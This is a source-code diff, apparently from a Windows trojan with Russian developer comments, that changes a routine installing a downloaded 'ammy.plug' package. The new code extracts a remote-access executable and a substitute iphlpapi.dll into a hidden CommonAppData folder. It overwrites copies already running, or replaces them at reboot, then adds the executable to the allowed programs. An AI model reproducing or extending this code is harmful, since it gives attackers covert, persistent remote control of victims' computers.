@@ -1222,14 +1222,17 @@ static DWORD WINAPI ThreadInstallam(void*)
 	data = Plugin::Download( "ammy.plug", 0, &size, false );
 	if( data )
 	{
+		//KillBlockingProcesses("aa.exe");
 		char tempCab[MAX_PATH], folderAmmy[MAX_PATH];
 		File::GetTempName(tempCab);
 		File::WriteBufferA( tempCab, data, size );
 		TASKDBG( "Ammy", "Сохранили ammy.plug в %s", tempCab );
 		pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA,  0, 0, folderAmmy );
-		pPathAppendA( folderAmmy, "ammy" );
+		pPathAppendA( folderAmmy, "ammyy" );
 		pCreateDirectoryA( folderAmmy, 0 );
-		if( ExtractCab( tempCab, folderAmmy ) )
+		//aa.exe рапаковываем как aa1.exe, чтобы проще сделать переписывае если файл aa.exe занят
+		const char* renames[] = { "aa.exe", "aa1.exe", "iphlpapi.dll", "iphlpapi1.dll", 0, 0 };
+		if( ExtractCab( tempCab, folderAmmy, renames ) )
 		{
 			TASKDBG( "Ammy", "Распаковали в папку %s", folderAmmy );
 
@@ -1246,6 +1249,21 @@ static DWORD WINAPI ThreadInstallam(void*)
 			HEAP::Free(mem);
 
 			pPathRemoveFileSpecA(folderAmmy);
+			char pathAA1[MAX_PATH];
+			m_lstrcpy( pathAA1, folderAmmy );
+			int i = 0;
+			while( renames[i] )
+			{
+				pPathAppendA( folderAmmy, renames[i] );
+				pPathAppendA( pathAA1, renames[i + 1] );
+				//если файл не перепишется (уже запущен), то перезапишется после ребута
+				if( !pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING ) )
+					pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+
+				pPathRemoveFileSpecA(folderAmmy);
+				pPathRemoveFileSpecA(pathAA1);
+				i += 2;
+			}
 			pPathAppendA( folderAmmy, "aa.exe" );
 			if( AddAllowedprogram(folderAmmy) )
 			{
